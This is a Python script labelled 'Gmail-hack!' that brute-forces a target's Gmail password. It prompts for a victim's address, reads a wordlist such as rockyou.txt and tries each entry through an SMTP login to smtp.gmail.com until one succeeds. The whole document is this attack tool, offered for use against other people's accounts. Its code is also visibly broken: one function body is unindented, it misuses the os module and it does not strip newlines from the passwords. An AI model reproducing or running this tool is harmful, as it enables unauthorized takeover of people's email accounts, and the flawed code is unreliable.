import smtplib
import sys
from os import system
def artwork():
    print("\n")
    print("##########################################################")
    print("#                                                        #")
    print("#                     \||/                               #")
    print("#                     |  @___oo                          #")
    print("#           /\  /\   / (__,,,,|                          #")
    print("#          ) /^\) ^\/ _)                Gmail-hack!      #")
    print("#          )   /^\/   _)            tweaked by mv4z      #")
    print("#          )   _ /  / _)                                 #")
    print("#      /\  )/\/ ||  | )_)                                #")
    print("#     <  >      |(,,) )__)                               #")
    print("#      ||      /    \)___)\                              #")
    print("#      | \____(      )___) )___                          #")
    print("#      \______(_______;;; __;;;                          #")
    print("#                                                        #")
    print("##########################################################")
    print("\n")
    
def cls():
if os == "nt":    # windows is classified as "nt"
    os.system("cls")
else:
    os.system("clear")

cls()
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Address => ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\n => ")

if pwd=='0':
    passswfile="rockyou.txt"

elif pwd=='1':
    print("\n")
    passswfile = input("Name The File Path (passlist) => ")

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Grabbed 🔥 %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Pasword Failure ❌. %s " % password)




